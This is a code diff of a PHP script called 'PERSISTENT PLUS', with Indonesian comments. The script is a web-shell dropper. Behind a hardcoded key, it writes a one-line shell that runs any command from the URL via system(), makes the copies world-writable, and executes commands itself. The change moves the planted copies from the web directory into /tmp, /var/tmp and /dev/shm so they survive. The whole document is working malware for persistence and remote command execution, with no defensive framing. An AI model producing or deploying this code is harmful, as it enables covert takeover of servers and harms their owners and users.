@@ -1,6 +1,6 @@
 <?php
 // ================================================================
-// PERSISTENT PLUS - Super Persistent (FIXED)
+// PERSISTENT PLUS – Backup ke Multiple Directories (FIXED)
 // ================================================================
 
 // Auth
@@ -8,23 +8,24 @@ if (!isset($_GET['key']) || $_GET['key'] !== 'your_secret_key') {
     die('Access denied');
 }
 
-$shells = ['shell.php','shell_backup.php','shell_hidden.php','shell_temp.php','shell_cache.php'];
+// Daftar direktori backup
+$backup_dirs = ['/tmp/', '/var/tmp/', '/dev/shm/'];
 $code = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>';
 
-foreach ($shells as $s) {
-    if (!file_exists($s)) {
-        file_put_contents($s, $code);
-        if (PHP_OS !== 'WINNT') { chmod($s, 0777); }
+foreach ($backup_dirs as $dir) {
+    if (is_writable($dir)) {
+        $file = $dir . 'shell_backup.php';
+        if (!file_exists($file)) {
+            file_put_contents($file, $code);
+            if (PHP_OS !== 'WINNT') { 
+                chmod($file, 0777); 
+            }
+        }
     }
 }
 
+// Eksekusi perintah
 if (isset($_GET['cmd'])) {
     system($_GET['cmd']);
-}
-
-// Auto-repair
-if (!file_exists('shell.php')) {
-    file_put_contents('shell.php', $code);
-    if (PHP_OS !== 'WINNT') { chmod('shell.php', 0777); }
 }
 ?>
